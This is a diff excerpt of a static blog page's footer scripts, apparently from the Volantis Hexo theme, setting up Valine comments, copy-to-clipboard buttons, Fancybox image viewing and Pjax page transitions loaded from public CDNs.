+  var REQUIRED_FIELDS = ['nick', 'mail', 'link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function (item) {
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+
+  function emoji(path, idx, ext) {
+    return path + "/" + path + "-" + idx + "." + ext;
+  }
+
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+
+  function pjax_valine() {
+    let pageUrl = $.trim($('#pjax-comment-path').text()) === "none" ? 
+      decodeURI(window.location.pathname) : $.trim($('#pjax-comment-path').text());
+    let pagePlaceholder = $.trim($('#pjax-comment-placeholder').text()) === "none" ?
+      "快来评论吧~" : $.trim($('#pjax-comment-placeholder').text());
+
+    let ALLPATH = '';
+    if(ALLPATH != '') pageUrl = ALLPATH;
+
+    var valine = new Valine();
+    valine.init({
+      el: '#valine_container',
+      meta: meta,
+      placeholder: pagePlaceholder,
+      path: pageUrl,
+      appId: "or2NepulP8NGKXehq1IRSQTc-gzGzoHsz",
+      appKey: "lRlc11XLlqK4AeDJeNJxo17y",
+      pageSize: '10',
+      avatar: 'robohash',
+      lang: 'zh-cn',
+      visitor: 'true',
+      highlight: 'true',
+      mathJax: 'false',
+      enableQQ: 'true',
+      requiredFields: requiredFields,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps
+    })
+  }
+
+  $(function () {
+    pjax_valine();
+  });
+</script>
+
+
+
+
+<!-- darkmodejs -->
+
+
+<!-- 复制 -->
+
+  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+    var clipboard = new ClipboardJS('.btn-copy', {
+        target: function (trigger) {
+            return trigger.nextElementSibling
+        }
+    });
+    function wait(callback, seconds) {
+        var timelag = null;
+        timelag = window.setTimeout(callback, seconds)
+    }
+    function pjax_initCopyCode() {
+        var copyHtml = '';
+        copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+        copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+        copyHtml += '</button>';
+        $(".highlight .code pre").before(copyHtml);
+        $(".article pre code").before(copyHtml);
+        clipboard.off('success').on('success', function (e) {
+            let $btn = $(e.trigger);
+            $btn.addClass('copied');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-check-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPIED';
+            wait(function () {
+                $icon.removeClass('fa-check-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        });
+        clipboard.off('error').on('error', function (e) {
+            e.clearSelection();
+            let $btn = $(e.trigger);
+            $btn.addClass('copy-failed');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-times-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPY FAILED';
+            wait(function () {
+                $icon.removeClass('fa-times-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        })
+    }
+    $(function () {
+        pjax_initCopyCode()
+    });
+</script>
+
+
+<!-- scrollreveal -->
+
+  <script src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    function pjax_scrollrebeal() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '32px',
+        duration: '800',
+        interval: '20',
+        scale: '1',
+        easing: 'ease-out'
+      });
+    }
+
+    $(function () {
+      pjax_scrollrebeal();
+    });
+  </script>
+
+<!-- ******************************** -->
+
+<!-- fancybox -->
+<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+<script>
+  function pjax_fancybox() {
+    $(".article-entry").find("img").not('.inline').not('a img').each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".article-entry").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  $(function () {
+    pjax_fancybox();
+  });
+</script>
+
+<!-- ******************************** -->
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+
+  
+    
+<script src="/js/search.js"></script>
+
+  
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js" data-pjax></script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function () {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@2/js/comment_typing.js"></script>
+
+
+
+
+
+
+
+    
+      
+
+
+<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>
+
+<!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <script src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+    <div id="loading-bar-wrapper"><script>NProgress.configure({parent:"#loading-bar-wrapper",trickleSpeed: 100})</script></div>
+    <script>
+      window.ShowLoading = function() {
+        NProgress.start();
+      };
+      window.HideLoading = function() {
+        NProgress.done();
+      }
+    </script>
+  
+</div>
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+      $.fancybox.close();    // 关闭弹窗
+      $('.l_header .switcher .s-search').removeClass('active'); // 关闭移动端激活的搜索框
+      $('.l_header').removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      $('.wrapper').removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      $('.s-top').unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+      window.ShowLoading();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      // 关于百度统计对 SPA 页面的处理：
+      // 方案一：百度统计>管理>单页应用设置中，打开开启按钮即可对SPA进行统计。 https://tongji.baidu.com/web/help/article?id=324
+      // 方案二：取消注释下列代码。 https://tongji.baidu.com/web/help/article?id=235
+      // 
+
+      // 关于谷歌统计对 SPA 页面的处理：
+      // 当应用以动态方式加载内容并更新地址栏中的网址时，也应该更新通过 gtag.js 存储的网页网址。
+      // https://developers.google.cn/analytics/devguides/collection/gtagjs/single-page-applications?hl=zh-cn
+      
+
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+
+      try{
+        pjax_fancybox();
+        
+          
+          if ('.cover') {
+            $('.cover').backstretch("resize");
+          } else {
+            $.backstretch("resize");
+          }
+        
+        
+        
+          pjax_scrollrebeal();
+        
+        
+          pjax_initCopyCode();
+        
+        
+          pjax_valine();
+        
+        
+        
+        
+        
+      } catch (e) {
+        console.log(e);
+      }
+      window.HideLoading();
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.HideLoading();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+
+    
+  </div>
+</body>
+</html>
